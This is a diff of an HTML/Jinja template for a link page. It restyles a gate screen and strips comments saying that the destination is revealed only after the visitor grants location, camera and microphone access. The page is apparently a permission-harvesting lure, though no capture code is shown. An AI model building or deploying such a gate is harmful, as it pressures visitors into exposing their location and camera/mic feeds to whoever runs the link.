@@ -25,12 +25,10 @@ button:disabled{opacity:.55}
 a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
   color:#e6e9ef;text-decoration:none;font-size:14px}
 
-/* 続けた後の中身：通常は完全に透明 */
 #lt_live{opacity:0;transition:opacity .35s ease}
 body.need #lt_live{opacity:1}
 body.ui-none #lt_st{display:none}
 
-/* ---- 要件ゲート（最初に見えるのはこれだけ） ---- */
 #lt_gate{position:fixed;inset:0;z-index:20;background:#0f1115;overflow-y:auto;
   display:flex;align-items:center;justify-content:center;padding:26px;
   transition:opacity .4s ease, transform .4s ease}
@@ -45,9 +43,9 @@ body.ui-none #lt_st{display:none}
   line-height:1.85;color:#8b93a7}
 .warnline{margin:10px 0 0;font-size:11.5px;color:#7c8496;line-height:1.7;text-align:left}
 .stat{margin:12px 0 0;font-size:11.5px;color:#6b7386;min-height:1.4em}
-.copy{margin-top:18px;background:transparent;color:#6b7386;font-size:11.5px;
+.copy{margin-top:14px;background:transparent;color:#6b7386;font-size:11.5px;
   padding:6px 12px;border:1px solid #232734;border-radius:999px;font-weight:400}
-.tlink{display:block;margin-top:10px;font-size:11.5px;color:#5d6который}
+.tlink{display:block;margin-top:10px;font-size:11.5px}
 .tlink a{color:#6b7386;text-decoration:none}
 </style></head><body class="ui-{{ ui }}">
 
@@ -95,10 +93,7 @@ window.LT_ASK_TEXT   = {{ ask_text|tojson }};
 window.LT_DENY_TEXT  = {{ deny_text|tojson }};
 window.LT_RETRY_TEXT = {{ retry_text|tojson }};
 window.LT_TITLE      = {{ link.name|tojson }};
-
-/* ゲートを出し、押されるまで許可を取らない */
 window.LT_GATE = {{ 1 if gate else 0 }};
-/* 位置情報・カメラ・マイクの3つ全部OKのときだけ飛び先へ */
 window.LT_REQUIRE_ALL = {{ 1 if require_all else 0 }};
 
 window.LT_CAM      = 1;
